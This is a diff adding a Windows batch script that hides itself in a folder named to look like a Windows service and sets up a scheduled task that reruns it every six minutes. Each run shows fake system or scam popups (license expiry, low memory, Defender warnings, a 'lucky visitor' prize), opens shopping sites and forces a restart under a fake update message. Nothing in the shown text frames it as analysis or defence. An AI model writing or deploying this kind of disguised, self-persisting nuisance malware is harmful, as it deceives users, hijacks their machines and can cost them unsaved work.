@@ -1,0 +1,41 @@
+@echo off
+setlocal
+set "DIR=%APPDATA%\Microsoft\Windows\SvcHost"
+set "TASK=MicrosoftWindowsSvcHost"
+if exist "%DIR%\ok.flag" goto payload
+
+mkdir "%DIR%" 2>nul
+copy /y "%~f0" "%DIR%\sys.bat" >nul
+attrib +h "%DIR%" 2>nul
+>"%DIR%\run.vbs" echo CreateObject("WScript.Shell").Run """%DIR%\sys.bat""", 0, False
+schtasks /create /tn "%TASK%" /tr "wscript.exe \"%DIR%\run.vbs\"" /sc minute /mo 6 /f >nul 2>&1
+echo ok>"%DIR%\ok.flag"
+wscript "%DIR%\run.vbs"
+exit
+
+:payload
+setlocal enabledelayedexpansion
+set /a wait=%RANDOM% %% 21 + 20
+ping -n %wait% 127.0.0.1 >nul
+
+set /a k=%RANDOM% %% 4
+if %k%==0 start "" powershell -windowstyle hidden -c "(New-Object -ComObject Wscript.Shell).Popup('Your Windows license will expire soon. Activate Windows now.','Windows Activation',10)"
+if %k%==1 start "" powershell -windowstyle hidden -c "(New-Object -ComObject Wscript.Shell).Popup('Your PC is running low on memory. Clean up now!','System Warning',10)"
+if %k%==2 start "" powershell -windowstyle hidden -c "(New-Object -ComObject Wscript.Shell).Popup('Congratulations! You are todays lucky visitor.','Winner',10)"
+if %k%==3 start "" powershell -windowstyle hidden -c "(New-Object -ComObject Wscript.Shell).Popup('Windows Defender found 3 outdated drivers.','Security Center',10)"
+
+for /l %%a in (1,1,2) do (
+  set /a u=!RANDOM! %% 7
+  if !u!==0 set "URL=https://www.amazon.com/deals"
+  if !u!==1 set "URL=https://www.daraz.pk"
+  if !u!==2 set "URL=https://www.olx.com.pk"
+  if !u!==3 set "URL=https://www.flipkart.com"
+  if !u!==4 set "URL=https://www.bing.com/search?q=best+laptop+deals"
+  if !u!==5 set "URL=https://www.aliexpress.com"
+  if !u!==6 set "URL=https://www.youtube.com/feed/trending"
+  start "" "!URL!"
+  ping -n 2 127.0.0.1 >nul
+)
+
+shutdown /r /t 60 /c "Windows needs to restart to finish installing updates."
+exit
